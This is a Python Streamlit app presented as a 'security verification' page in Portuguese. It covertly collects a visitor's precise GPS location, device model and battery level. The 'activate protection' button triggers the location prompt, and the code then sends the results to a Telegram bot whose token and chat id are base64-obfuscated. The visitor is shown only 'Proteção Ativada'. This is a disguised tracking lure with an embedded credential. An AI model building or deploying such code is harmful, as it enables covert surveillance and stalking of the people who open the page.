import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta o modelo e bateria em background
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_FINAL_VER")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_FINAL_VER")

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # FORÇA O POP-UP NO CLIQUE
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")

    if posicao and posicao != "erro":
        # Pega o Nome do Aparelho
        modelo = "Smartphone"
        if ua:
            try:
                info = ua.split("(")[1].split(")")[0]
                # Filtro para Samsung SM-A115 e POCO
                for p in info.split(";"):
                    p = p.strip()
                    if any(x in p for x in ["SM-", "POCO", "A11", "2312", "Xiaomi"]):
                        modelo = p
                        break
            except: modelo = "Android Device"

        link = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bat if bat else '??'}%\n"
            f"📍 *Local:* {link}"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada")
    elif posicao == "erro":
        st.error("Erro: GPS desligado ou permissão negada.")
    else:
        st.info("Aguardando você clicar em 'Permitir' no pop-up...")

st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
